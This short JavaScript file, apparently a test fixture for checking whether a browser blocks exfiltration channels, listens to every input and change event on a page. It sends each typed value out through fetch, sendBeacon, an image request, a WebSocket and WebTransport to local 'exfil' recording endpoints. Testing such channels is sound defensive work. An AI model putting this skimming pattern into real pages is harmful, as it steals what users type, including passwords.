// Tries every channel with the typed value on each input/change.
function leak(e) {
  var v = encodeURIComponent((e.target && e.target.value) || "");
  fetch("/record/exfil_fetch?v=" + v, {method: "POST", body: v}).catch(function () {});
  try { navigator.sendBeacon("/record/exfil_beacon?v=" + v, v); } catch (x) {}
  var img = new Image(); img.src = "/record/exfil_image?v=" + v;
  try { var ws = new WebSocket("ws://127.0.0.1:8421/ws/exfil"); ws.onopen = function () { ws.send(v); }; } catch (x) {}
  try { if (window.WebTransport) { new WebTransport("https://127.0.0.1:8422/exfil").ready.catch(function () {}); } } catch (x) {}
}
document.addEventListener("input", leak);
document.addEventListener("change", leak);
